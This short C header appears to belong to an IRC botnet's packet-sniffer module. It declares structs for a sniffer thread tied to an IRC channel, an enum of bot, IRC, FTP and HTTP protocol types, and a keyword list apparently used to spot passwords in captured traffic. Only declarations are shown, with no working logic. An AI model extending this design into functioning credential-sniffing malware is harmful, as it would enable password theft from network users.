#ifndef NO_PSNIFF
typedef struct PSNIFF
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} PSNIFF;

enum {UNKNOWN,BOTP,IRCP,FTPP,HTTPP};

typedef struct PSWORDS
{
	char text[20];
	int type;

} PSWORDS;


DWORD WINAPI SniffThread(LPVOID param);
#endif
